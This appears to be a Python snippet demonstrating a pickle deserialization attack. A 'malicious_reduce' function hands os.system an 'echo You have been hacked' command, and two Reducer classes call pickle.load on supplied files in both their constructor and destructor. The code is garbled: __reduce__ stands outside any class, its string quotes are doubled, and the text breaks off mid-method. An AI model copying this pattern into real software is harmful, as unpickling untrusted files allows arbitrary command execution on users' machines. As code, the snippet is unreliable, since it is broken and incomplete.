import pickle
import os

def malicious_reduce(self): 
    return (os.system, (""echo You have been hacked"",)) 
def __reduce__(self): 
    return malicious_reduce, () 

class Reducer(object): 
    def __init__(self, file_name): 
        self.file_name = file_name 
        self.file = open(self.file_name, ""rb"") 
        self.reducer = pickle.load(self.file) 
        self.file.close() 
    def __del__(self): 
        self.file = open(self.file_name, ""rb"") 
        self.reducer = pickle.load(self.file) 
        self.file.close() 
    def __call__(self, *args, **kwargs): 
        return self.reducer(*args, **kwargs) 

class Reducer_2(object): 
    def __init__(self, file_name): 
        self.file_name = file_name 
        self.file = open(self.file_name, ""rb"") 
        self.reducer = pickle.load(self.file) 
        self.file.close() 
    def __del__(self):